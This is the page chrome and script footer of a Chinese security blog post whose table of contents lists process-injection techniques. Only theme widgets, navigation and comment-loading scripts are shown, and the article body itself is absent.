is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BB%A5%E7%94%A8%E8%BF%9B%E7%A8%8Bshellcode%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">0x02 滥用进程(shellcode注入)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%85%B3%E4%BA%8E%E8%BF%9B%E7%A8%8B%E6%BB%A5%E7%94%A8%E7%9A%84%E6%89%A9%E5%B1%95%E8%BF%9B%E7%A8%8B%E9%95%82%E7%A9%BA"><span class="toc-number">3.</span> <span class="toc-text">0x03 关于进程滥用的扩展(进程镂空)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%BB%A5%E7%94%A8%E8%BF%9B%E7%A8%8B%E7%BB%84%E4%BB%B6%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%8A%AB%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">0x04 滥用进程组件(线程执行劫持)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E6%BB%A5%E7%94%A8dlls%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">0x05 滥用DLLs(动态链接库注入)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E7%9A%84%E5%85%B6%E4%BB%96%E6%96%B9%E6%A1%88"><span class="toc-number">6.</span> <span class="toc-text">0x06 关于内存执行的其他方案</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-number">6.1.</span> <span class="toc-text">调用函数指针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%AD%A5%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">异步过程调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#section-manipulationpe%E8%8A%82%E5%A4%84%E7%90%86"><span class="toc-number">6.3.</span> <span class="toc-text">Section Manipulation(PE节处理)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B3%A8%E5%85%A5%E5%92%8C%E9%92%A9%E5%AD%90hooking%E7%9A%84%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6"><span class="toc-number">7.</span> <span class="toc-text">0x07 浏览器注入和钩子(Hooking)的案例研究</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">0x08 总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
+      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
+      avatar: 'mp',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const getIcon = (icon, mail) => {
+    if (icon) return icon
+    let defaultIcon = '?d=mp'
+    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
+    return iconUrl
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
+        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
